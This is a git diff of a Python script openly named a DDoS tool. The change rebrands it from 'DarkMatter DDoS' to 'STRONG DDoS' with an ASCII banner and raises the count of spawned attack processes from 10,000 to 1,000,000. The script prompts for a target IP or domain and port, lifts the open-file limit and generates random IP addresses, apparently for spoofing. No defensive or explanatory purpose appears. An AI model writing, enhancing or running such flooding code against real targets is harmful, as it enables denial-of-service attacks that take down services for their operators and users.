@@ -7,16 +7,16 @@ import platform
 
 print("Detecting System...")
 sysOS = platform.system()
-print("System detected: ", sysOS)
+print("System Detected: ", sysOS)
 
 if sysOS == "Linux":
   try:
     os.system("ulimit -n 1030000")
   except Exception as e:
     print(e)
-    print("Could not start the script")
+    print("Could Not Start The Script")
 else:
-  print("Your system is not Linux, You may not be able to run this script in some systems")
+  print("Your System is Not Linux, You May Not Be Able To Run This Script in Some Systems")
 
 
 def randomip():
@@ -42,15 +42,23 @@ def attack():
     except:
       pass
 
-print("Welcome To DarkMatter DDoS\n")
+print("Welcome To STRONG DDoS\n")
+print("███████╗████████╗██████╗  ██████╗ ███╗   ██╗ ██████╗ \n")
+print("██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗████╗  ██║██╔════╝ \n")
+print("███████╗   ██║   ██████╔╝██║   ██║██╔██╗ ██║██║  ███╗\n")
+print("╚════██║   ██║   ██╔══██╗██║   ██║██║╚██╗██║██║   ██║\n")
+print("███████║   ██║   ██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝\n")
+print("╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ \n")
+print("Welcome To STRONG DDoS\n")
+                                                     
 ip = input("IP/Domain : ")
 port = int(input("Port : "))
 url = f"http://{str(ip)}"
-print("[>>>] Starting the attack [<<<]")
+print("[>>] Starting The Attack [<<]")
 sleep(1)
 
 def send2attack():
-  for i in range(10000): #Magic Power
+  for i in range(1000000): #Magic Power
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
